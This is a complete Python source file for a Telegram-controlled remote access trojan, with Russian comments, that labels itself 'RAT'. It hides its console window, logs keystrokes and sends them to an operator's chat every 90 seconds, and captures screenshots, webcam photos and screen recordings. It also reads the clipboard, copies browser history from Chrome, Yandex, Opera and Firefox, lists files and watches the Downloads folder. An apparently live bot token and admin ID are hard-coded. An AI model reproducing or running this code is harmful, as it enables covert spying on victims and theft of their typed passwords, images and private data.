import os
import sys
import time
import threading
import datetime
import logging
import sqlite3
import platform
import subprocess
import shutil
import tempfile

import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove

import pyautogui
from pynput.keyboard import Listener as KeyboardListener, Key
import psutil
import cv2
import numpy as np

# ────────────────────────────────────────────────
# ЗАЩИТА ОТ ДВУХ ЭКЗЕМПЛЯРОВ (решает ошибку 409)
# ────────────────────────────────────────────────

LOCK_FILE = "tgrat.lock"

def acquire_lock():
    try:
        lock = open(LOCK_FILE, "w")
        # Для Windows используем простой способ (fcntl не всегда есть)
        if os.name == 'nt':
            import msvcrt
            msvcrt.locking(lock.fileno(), msvcrt.LK_NBLCK, 1)
        else:
            import fcntl
            fcntl.flock(lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
        return lock
    except:
        print("Другая копия бота уже запущена! Выход.")
        sys.exit(1)

# ────────────────────────────────────────────────
# ЛОГИ + скрытие окна + запись ошибок
# ────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler("tgrat.log", encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)

def log_error(msg):
    with open("tgrat_errors.log", "a", encoding="utf-8") as f:
        f.write(f"[{datetime.datetime.now()}] {msg}\n")
        import traceback
        f.write(traceback.format_exc() + "\n\n")

if sys.platform.startswith("win"):
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ────────────────────────────────────────────────
# Конфиг
# ────────────────────────────────────────────────

TOKEN = "8599187945:AAG75ElFul70OCIG0YkTHHS5TAm43V2ogTE"
ADMIN_ID = 7330059190

bot = telebot.TeleBot(TOKEN)

keylog_active = False
keylog_lines = []
keylog_lock = threading.Lock()

screenrec_active = False
screenrec_filename = "screenrec.mp4"

# ────────────────────────────────────────────────
# Кейлоггер (в память + отправка в чат)
# ────────────────────────────────────────────────

def on_press(key):
    if not keylog_active: return
    try:
        char = key.char if hasattr(key, 'char') and key.char else f' [{key.name.upper() if hasattr(key, "name") else str(key)}] '
        if key == Key.space: char = ' [SPACE] '
        if key == Key.enter: char = ' [ENTER] '
        if key == Key.backspace: char = ' [BACKSPACE] '
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with keylog_lock:
            keylog_lines.append(f"{ts} | {char}")
    except Exception as e:
        log_error(f"Keylog error: {e}")

def send_keylog():
    with keylog_lock:
        if not keylog_lines: return
        text = "\n".join(keylog_lines[-300:])
        if len(text) > 3900: text = text[-3900:] + "\n... (обрезано)"
        try:
            bot.send_message(ADMIN_ID, f"⌨️ Кейлог:\n```\n{text}\n```", parse_mode="Markdown")
            keylog_lines.clear()
        except Exception as e:
            log_error(f"Send keylog error: {e}")

def auto_send_keylog():
    while True:
        time.sleep(90)
        if keylog_active:
            send_keylog()

# ────────────────────────────────────────────────
# Проверка новых файлов в Downloads (замена watchdog)
# ────────────────────────────────────────────────

last_downloads = set()

def check_downloads():
    global last_downloads
    path = os.path.expanduser("\~/Downloads")
    if not os.path.exists(path): return
    current = set(os.listdir(path))
    new = current - last_downloads
    for f in new:
        if not f.startswith('.'):
            full = os.path.join(path, f)
            bot.send_message(ADMIN_ID, f"🆕 Новый файл в Downloads:\n{full}")
    last_downloads = current

def auto_check_downloads():
    while True:
        time.sleep(60)
        check_downloads()

# ────────────────────────────────────────────────
# Браузерная история (Chrome + Yandex + Opera + Firefox)
# ────────────────────────────────────────────────

def get_browser_history(browser="chrome", limit=10):
    paths = {
        "chrome": r"\~\AppData\Local\Google\Chrome\User Data\Default\History",
        "yandex": r"\~\AppData\Local\Yandex\YandexBrowser\User Data\Default\History",
        "opera": r"\~\AppData\Roaming\Opera Software\Opera Stable\History",
        "firefox": None
    }
    path = os.path.expanduser(paths.get(browser, ""))
    if not path or not os.path.exists(path):
        return f"{browser.capitalize()} не найден"

    try:
        tmp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
        shutil.copy2(path, tmp_db.name) if browser != "firefox" else None

        if browser != "firefox":
            conn = sqlite3.connect(tmp_db.name)
            c = conn.cursor()
            c.execute(f"SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT {limit}")
            rows = c.fetchall()
            conn.close()
            os.unlink(tmp_db.name)
            if not rows:
                return "История пуста"
            return "\n".join([f"{datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=r[2]):%Y-%m-%d %H:%M} → {r[1]} → {r[0]}" for r in rows])

        else:
            profile_dir = os.path.expanduser(r"\~\AppData\Roaming\Mozilla\Firefox\Profiles")
            if not os.path.exists(profile_dir):
                return "Firefox не найден"
            for profile in os.listdir(profile_dir):
                if profile.endswith((".default-release", ".default")):
                    db_path = os.path.join(profile_dir, profile, "places.sqlite")
                    if os.path.exists(db_path):
                        tmp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
                        shutil.copy2(db_path, tmp_db.name)
                        conn = sqlite3.connect(tmp_db.name)
                        c = conn.cursor()
                        c.execute(f"SELECT url, title, visit_date FROM moz_places JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id ORDER BY visit_date DESC LIMIT {limit}")
                        rows = c.fetchall()
                        conn.close()
                        os.unlink(tmp_db.name)
                        if not rows:
                            return "История пуста"
                        return "\n".join([f"{datetime.datetime(1970,1,1) + datetime.timedelta(microseconds=r[2]):%Y-%m-%d %H:%M} → {r[1]} → {r[0]}" for r in rows])
            return "Профиль Firefox не найден"
    except Exception as e:
        return f"Ошибка {browser}: {str(e)}"

# ────────────────────────────────────────────────
# Sysinfo
# ────────────────────────────────────────────────

def get_sysinfo():
    try:
        ip = subprocess.getoutput("curl -s ifconfig.me").strip() or "не удалось"
    except:
        ip = "не удалось"
    return f"""🖥 ОС: {platform.system()} {platform.release()}
👤 Пользователь: {os.getlogin()}
⚙️ CPU: {platform.processor()}
🧠 RAM: {round(psutil.virtual_memory().total / (1024**3), 1)} GB
🌐 IP внешний: {ip}"""

# ────────────────────────────────────────────────
# Меню
# ────────────────────────────────────────────────

@bot.message_handler(commands=['start', 'help'])
def cmd_start(message):
    if not is_admin(message.from_user.id): return
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
    markup.add(
        KeyboardButton("📸 Скрин"),
        KeyboardButton("📷 Вебка"),
        KeyboardButton("🎥 Запись экрана")
    )
    markup.add(
        KeyboardButton("ℹ️ Sysinfo"),
        KeyboardButton("⌨️ Keylog ON"),
        KeyboardButton("📋 Keylog GET")
    )
    markup.add(
        KeyboardButton("📋 Буфер"),
        KeyboardButton("🌐 Все браузеры"),
        KeyboardButton("📂 Файлы")
    )
    markup.add(
        KeyboardButton("📍 Геолокация"),
        KeyboardButton("🔄 Restart"),
        KeyboardButton("🟢 Status")
    )
    bot.send_message(message.chat.id, "🚀 RAT онлайн.\nВыбирай:", reply_markup=markup)

def is_admin(uid):
    return uid == ADMIN_ID

# ────────────────────────────────────────────────
# Команды (все с защитой от ошибок)
# ────────────────────────────────────────────────

@bot.message_handler(commands=['screenshot'])
def cmd_screenshot(message):
    if not is_admin(message.from_user.id): return
    try:
        path = f"screenshot_{int(time.time())}.png"
        pyautogui.screenshot().save(path)
        with open(path, 'rb') as f:
            bot.send_photo(message.chat.id, f, caption="📸 Скриншот")
        os.remove(path)
    except Exception as e:
        log_error(f"Screenshot error: {e}")
        bot.reply_to(message, f"❌ Ошибка скриншота: {str(e)}")

@bot.message_handler(commands=['webcam'])
def cmd_webcam(message):
    if not is_admin(message.from_user.id): return
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if not ret:
            bot.reply_to(message, "❌ Камера не отвечает")
            return
        path = f"webcam_{int(time.time())}.jpg"
        cv2.imwrite(path, frame)
        with open(path, 'rb') as f:
            bot.send_photo(message.chat.id, f, caption="📷 Веб-камера")
        os.remove(path)
    except Exception as e:
        log_error(f"Webcam error: {e}")
        bot.reply_to(message, f"❌ Ошибка вебки: {str(e)}")

@bot.message_handler(commands=['screenrec_start'])
def cmd_screenrec_start(message):
    global screenrec_active
    if not is_admin(message.from_user.id): return
    if screenrec_active:
        bot.reply_to(message, "🎥 Уже пишется")
        return
    sec = 30
    try: sec = max(10, min(300, int(message.text.split()[1])))
    except: pass
    screenrec_active = True
    threading.Thread(target=record_screen, args=(sec,), daemon=True).start()
    bot.reply_to(message, f"🎥 Запись на {sec} сек")

def record_screen(duration):
    global screenrec_active
    try:
        out = cv2.VideoWriter(screenrec_filename, cv2.VideoWriter_fourcc(*"mp4v"), 12, pyautogui.size())
        start = time.time()
        while screenrec_active and time.time() - start < duration:
            frame = cv2.cvtColor(np.array(pyautogui.screenshot()), cv2.COLOR_RGB2BGR)
            out.write(frame)
            time.sleep(0.08)
        out.release()
        if os.path.exists(screenrec_filename):
            with open(screenrec_filename, 'rb') as v:
                bot.send_video(ADMIN_ID, v, caption=f"🎥 Запись завершена ({duration} сек)")
            os.remove(screenrec_filename)
    except Exception as e:
        log_error(f"Screen rec error: {e}")
    finally:
        screenrec_active = False

@bot.message_handler(commands=['screenrec_stop'])
def cmd_screenrec_stop(message):
    global screenrec_active
    screenrec_active = False
    bot.reply_to(message, "⏹ Запись останавливается...")

@bot.message_handler(commands=['sysinfo'])
def cmd_sysinfo(message):
    if not is_admin(message.from_user.id): return
    bot.reply_to(message, f"📊 Системная информация:\n{get_sysinfo()}")

@bot.message_handler(commands=['keylog_start'])
def cmd_keylog_start(message):
    global keylog_active
    if not is_admin(message.from_user.id): return
    keylog_active = True
    bot.reply_to(message, "⌨️ Кейлоггер запущен")

@bot.message_handler(commands=['keylog_stop'])
def cmd_keylog_stop(message):
    global keylog_active
    if not is_admin(message.from_user.id): return
    if not keylog_active:
        bot.reply_to(message, "Кейлоггер не активен")
        return
    keylog_active = False
    send_keylog()
    bot.reply_to(message, "⌨️ Кейлоггер остановлен и лог отправлен")

@bot.message_handler(commands=['keylog_get'])
def cmd_keylog_get(message):
    if not is_admin(message.from_user.id): return
    send_keylog()

@bot.message_handler(commands=['clip'])
def cmd_clip(message):
    if not is_admin(message.from_user.id): return
    try:
        import pyperclip
        text = pyperclip.paste()
        bot.reply_to(message, f"📋 Буфер обмена:\n{text[:3500]}")
    except Exception as e:
        log_error(f"Clip error: {e}")
        bot.reply_to(message, f"❌ {e}")

@bot.message_handler(commands=['browser_all'])
def cmd_browser_all(message):
    if not is_admin(message.from_user.id): return
    text = ""
    for br in ["chrome", "yandex", "opera", "firefox"]:
        hist = get_browser_history(br, 8)
        text += f"\n\n🌐 {br.capitalize()}:\n{hist}"
    if len(text) > 3900:
        text = text[:3900] + "..."
    bot.reply_to(message, text)

@bot.message_handler(commands=['files'])
def cmd_files(message):
    if not is_admin(message.from_user.id): return
    try:
        path = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else os.path.expanduser("\~")
        if not os.path.exists(path):
            bot.reply_to(message, "❌ Путь не существует")
            return
        lines = []
        count = 0
        for root, _, files in os.walk(path):
            for file in files:
                if count >= 150: break
                fp = os.path.join(root, file)
                try:
                    size_mb = os.path.getsize(fp) / (1024 * 1024)
                    mtime = datetime.datetime.fromtimestamp(os.path.getmtime(fp)).strftime("%Y-%m-%d %H:%M")
                    lines.append(f"{fp} | {size_mb:.2f} MB | {mtime}")
                    count += 1
                except:
                    pass
            if count >= 150: break
        if not lines:
            bot.reply_to(message, "Файлов не найдено")
            return
        text = "\n".join(lines)
        if len(text) > 3800:
            text = text[:3700] + "\n... (обрезано)"
        bot.reply_to(message, f"📂 Файлы в {path}:\n```\n{text}\n```", parse_mode="Markdown")
    except Exception as e:
        log_error(f"Files error: {e}")
        bot.reply_to(message, f"❌ {e}")

@bot.message_handler(commands=['status'])
def cmd_status(message):
    if not is_admin(message.from_user.id): return
    bot.reply_to(message, f"🟢 RAT онлайн\nКейлоггер: {'ВКЛ' if keylog_active else 'ВЫКЛ'}\nВерсия: stable")

@bot.message_handler(commands=['restart'])
def cmd_restart(message):
    if not is_admin(message.from_user.id): return
    bot.reply_to(message, "🔄 Перезапуск...")
    os.execv(sys.executable, ['python'] + sys.argv)

# ────────────────────────────────────────────────
# Запуск
# ────────────────────────────────────────────────

if __name__ == '__main__':
    lock = acquire_lock()  # Защита от двойного запуска

    logging.info("=== RAT ЗАПУЩЕН ===")

    threading.Thread(target=auto_send_keylog, daemon=True).start()
    threading.Thread(target=lambda: KeyboardListener(on_press=on_press).join(), daemon=True).start()
    threading.Thread(target=auto_check_downloads, daemon=True).start()

    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=30)
        except Exception as e:
            logging.error(f"Polling error: {e}")
            time.sleep(5)